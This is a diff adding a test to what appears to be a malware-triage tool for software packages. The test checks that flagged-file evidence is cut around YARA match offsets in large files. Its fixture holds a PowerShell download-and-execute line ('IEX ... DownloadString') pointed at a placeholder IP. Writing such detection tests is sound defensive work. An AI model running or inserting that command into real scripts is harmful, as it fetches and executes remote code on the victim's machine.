@@ -165,3 +165,13 @@ def test_decode_payload_describes_binary_and_skips_garbage():
 
     assert package_features.decode_payload(base64.b64encode(b"MZ" + b"\x00" * 300).decode())["kind"] == "Windows PE"
     assert package_features.decode_payload(base64.b64encode(bytes(range(256)) * 2).decode())["kind"] == "binary data"
+
+
+def test_triage_evidence_uses_yara_match_offsets_for_large_files():
+    filler = "é = 1;\n" * 6000  # multi-byte characters: byte and character offsets differ
+    data = (filler + "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')\n" + filler).encode()
+    offset = data.index(b"IEX")
+    finding = {"file_path": "package/x.ps1", "match_offsets": [offset], "safe_context": ""}
+    item = package_features.triage_evidence([("package/x.ps1", data)], [finding], [])["flagged_files"][0]
+    assert item["truncated"] is True and item["complete"] is False and item["matched_regions_shown"] is True
+    assert "DownloadString('http://203.0.113.9/a')" in item["content"]
